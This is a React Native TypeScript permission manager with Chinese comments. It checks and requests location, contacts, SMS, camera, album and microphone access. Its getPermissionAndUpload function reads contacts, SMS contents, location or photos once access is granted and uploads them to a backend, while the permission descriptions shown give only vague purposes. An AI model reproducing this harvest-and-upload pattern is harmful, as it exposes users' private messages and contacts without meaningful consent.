import { check, request, RESULTS, PERMISSIONS } from 'react-native-permissions';
import { Platform, PermissionsAndroid } from 'react-native';
import { uploadLocation, uploadContacts, uploadSMS, uploadAlbum } from './permissionUpload';
import { useAuth } from '../context/AuthContext';

// 权限类型定义
export type PermissionType = 'location' | 'contacts' | 'sms' | 'camera' | 'album' | 'microphone';

// 权限状态
export type PermissionStatus = 'granted' | 'denied' | 'blocked' | 'unavailable' | 'limited';

// 权限配置
interface PermissionConfig {
  key: string;
  label: string;
  description: string;
  required: boolean;
}

// 获取权限配置
const getPermissionConfig = (type: PermissionType): PermissionConfig | null => {
  if (Platform.OS === 'android') {
    const androidPermissions: Record<PermissionType, PermissionConfig> = {
      location: {
        key: PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,
        label: '位置权限',
        description: '用于获取当前位置信息',
        required: false
      },
      contacts: {
        key: PERMISSIONS.ANDROID.READ_CONTACTS,
        label: '通讯录权限',
        description: '用于访问联系人信息',
        required: false
      },
      sms: {
        key: PERMISSIONS.ANDROID.READ_SMS,
        label: '短信权限',
        description: '用于读取短信内容',
        required: false
      },
      camera: {
        key: PERMISSIONS.ANDROID.CAMERA,
        label: '相机权限',
        description: '用于拍照功能',
        required: false
      },
      album: {
        key: PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE,
        label: '相册权限',
        description: '用于访问相册',
        required: false
      },
      microphone: {
        key: PERMISSIONS.ANDROID.RECORD_AUDIO,
        label: '麦克风权限',
        description: '用于语音通话',
        required: false
      }
    };
    return androidPermissions[type] || null;
  } else if (Platform.OS === 'ios') {
    const iosPermissions: Record<PermissionType, PermissionConfig> = {
      location: {
        key: PERMISSIONS.IOS.LOCATION_WHEN_IN_USE,
        label: '位置权限',
        description: '用于获取当前位置信息',
        required: false
      },
      contacts: {
        key: PERMISSIONS.IOS.CONTACTS,
        label: '通讯录权限',
        description: '用于访问联系人信息',
        required: false
      },
      sms: {
        key: 'sms', // iOS不支持短信权限
        label: '短信权限',
        description: 'iOS不支持短信权限',
        required: false
      },
      camera: {
        key: PERMISSIONS.IOS.CAMERA,
        label: '相机权限',
        description: '用于拍照功能',
        required: false
      },
      album: {
        key: PERMISSIONS.IOS.PHOTO_LIBRARY,
        label: '相册权限',
        description: '用于访问相册',
        required: false
      },
      microphone: {
        key: PERMISSIONS.IOS.MICROPHONE,
        label: '麦克风权限',
        description: '用于语音通话',
        required: false
      }
    };
    return iosPermissions[type] || null;
  }
  return null;
};

// 检查权限状态
export const checkPermission = async (type: PermissionType): Promise<PermissionStatus> => {
  try {
    const config = getPermissionConfig(type);
    if (!config) {
      console.log(`❌ 不支持的权限类型: ${type}`);
      return 'unavailable';
    }

    const status = await check(config.key as any);
    console.log(`🔍 权限 ${config.label} 状态: ${status}`);
    return status as PermissionStatus;
  } catch (error) {
    console.error(`❌ 检查权限 ${type} 失败:`, error);
    return 'unavailable';
  }
};

// 请求权限
export const requestPermission = async (type: PermissionType): Promise<PermissionStatus> => {
  try {
    const config = getPermissionConfig(type);
    if (!config) {
      console.log(`❌ 不支持的权限类型: ${type}`);
      return 'unavailable';
    }

    console.log(`📱 请求权限: ${config.label}`);
    const status = await request(config.key as any);
    console.log(`📋 权限 ${config.label} 请求结果: ${status}`);
    return status as PermissionStatus;
  } catch (error) {
    console.error(`❌ 请求权限 ${type} 失败:`, error);
    return 'denied';
  }
};

// 确保权限已获取（检查+请求）
export const ensurePermission = async (type: PermissionType): Promise<PermissionStatus> => {
  try {
    // 先检查当前状态
    let status = await checkPermission(type);
    
    // 如果未授权，尝试请求
    if (status === 'denied') {
      console.log(`📱 权限 ${type} 未授权，尝试请求...`);
      status = await requestPermission(type);
    }
    
    return status;
  } catch (error) {
    console.error(`❌ 确保权限 ${type} 失败:`, error);
    return 'denied';
  }
};

// 按需获取权限并上传数据
export const getPermissionAndUpload = async (
  type: PermissionType, 
  userToken: string,
  dataCollector?: () => Promise<any>
): Promise<{ success: boolean; data?: any; error?: string; uploadResult?: any }> => {
  try {
    console.log(`🚀 开始获取权限并上传数据: ${type}`);
    
    // 确保权限已获取
    const permissionStatus = await ensurePermission(type);
    
    if (permissionStatus !== 'granted') {
      console.log(`❌ 权限 ${type} 未获取，状态: ${permissionStatus}`);
      return { 
        success: false, 
        error: `权限未获取: ${permissionStatus}` 
      };
    }
    
    console.log(`✅ 权限 ${type} 已获取，开始收集数据`);
    
    // 收集数据
    let data;
    if (dataCollector) {
      data = await dataCollector();
      console.log(`📊 数据收集完成:`, data);
    }
    
    // 上传数据到后台
    let uploadResult;
    switch (type) {
      case 'location':
        uploadResult = await uploadLocation(userToken, data);
        break;
      case 'contacts':
        uploadResult = await uploadContacts(userToken, data);
        break;
      case 'sms':
        uploadResult = await uploadSMS(userToken, data);
        break;
      case 'album':
        uploadResult = await uploadAlbum(userToken, data);
        break;
      default:
        console.log(`⚠️ 权限类型 ${type} 暂不支持数据上传`);
        return { success: true, data };
    }
    
    console.log(`✅ 数据上传成功:`, uploadResult);
    return { success: true, data, uploadResult };
    
  } catch (error) {
    console.error(`❌ 获取权限并上传数据失败:`, error);
    return { 
      success: false, 
      error: error instanceof Error ? error.message : '未知错误' 
    };
  }
};

// 批量检查权限状态
export const checkAllPermissions = async (): Promise<Record<PermissionType, PermissionStatus>> => {
  const permissions: PermissionType[] = ['location', 'contacts', 'sms', 'camera', 'album', 'microphone'];
  const results: Record<PermissionType, PermissionStatus> = {} as any;
  
  for (const permission of permissions) {
    results[permission] = await checkPermission(permission);
  }
  
  return results;
};

// 获取权限状态摘要
export const getPermissionSummary = (statuses: Record<PermissionType, PermissionStatus>) => {
  const granted = Object.values(statuses).filter(s => s === 'granted').length;
  const total = Object.keys(statuses).length;
  
  return {
    granted,
    total,
    percentage: Math.round((granted / total) * 100),
    statuses
  };
};

// 麦克风权限专用检查函数（语音通话必需）
export const checkMicrophonePermission = async (): Promise<boolean> => {
  try {
    console.log('🔍 [PermissionManager] 检查麦克风权限...');
    
    if (Platform.OS === 'android') {
      const hasPermission = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.RECORD_AUDIO
      );
      console.log('📱 [PermissionManager] Android麦克风权限状态:', hasPermission ? '已授权' : '未授权');
      return hasPermission;
    } else {
      const status = await check(PERMISSIONS.IOS.MICROPHONE);
      console.log('🍎 [PermissionManager] iOS麦克风权限状态:', status);
      return status === RESULTS.GRANTED;
    }
  } catch (error) {
    console.error('❌ [PermissionManager] 检查麦克风权限失败:', error);
    return false;
  }
};

// 麦克风权限专用请求函数（语音通话必需）
export const requestMicrophonePermission = async (): Promise<boolean> => {
  try {
    console.log('📱 [PermissionManager] 请求麦克风权限...');
    
    if (Platform.OS === 'android') {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
        {
          title: '麦克风权限',
          message: '语音通话需要访问您的麦克风',
          buttonNeutral: '稍后询问',
          buttonNegative: '拒绝',
          buttonPositive: '允许',
        }
      );
      
      const hasPermission = granted === PermissionsAndroid.RESULTS.GRANTED;
      console.log('📱 [PermissionManager] Android麦克风权限请求结果:', hasPermission ? '已授权' : '被拒绝');
      return hasPermission;
    } else {
      const result = await request(PERMISSIONS.IOS.MICROPHONE);
      const hasPermission = result === RESULTS.GRANTED;
      console.log('🍎 [PermissionManager] iOS麦克风权限请求结果:', hasPermission ? '已授权' : '被拒绝');
      return hasPermission;
    }
  } catch (error) {
    console.error('❌ [PermissionManager] 请求麦克风权限失败:', error);
    return false;
  }
};

// 🔧 iOS首次使用修复：确保麦克风权限已获取（检查+请求），并通知初始化管理器
export const ensureMicrophonePermission = async (): Promise<boolean> => {
  try {
    // 先检查当前状态
    let hasPermission = await checkMicrophonePermission();
    
    // 如果未授权，尝试请求
    if (!hasPermission) {
      console.log('📱 [PermissionManager] 麦克风权限未授权，尝试请求...');
      hasPermission = await requestMicrophonePermission();
      
      // 🍎 iOS特殊处理：权限获取成功后，通知初始化管理器完成音频会话设置
      if (hasPermission && Platform.OS === 'ios') {
        try {
          console.log('🔧 [PermissionManager] iOS麦克风权限获取成功，通知初始化管理器...');
          const IOSInitializationManager = require('./IOSInitializationManager').default;
          await IOSInitializationManager.getInstance().initializeAudioSessionAfterPermission();
          console.log('✅ [PermissionManager] iOS初始化管理器音频会话配置完成');
        } catch (audioError) {
          console.warn('⚠️ [PermissionManager] iOS权限后音频会话配置失败（不影响基本功能）:', audioError);
        }
      }
    }
    
    return hasPermission;
  } catch (error) {
    console.error('❌ [PermissionManager] 确保麦克风权限失败:', error);
    return false;
  }
};
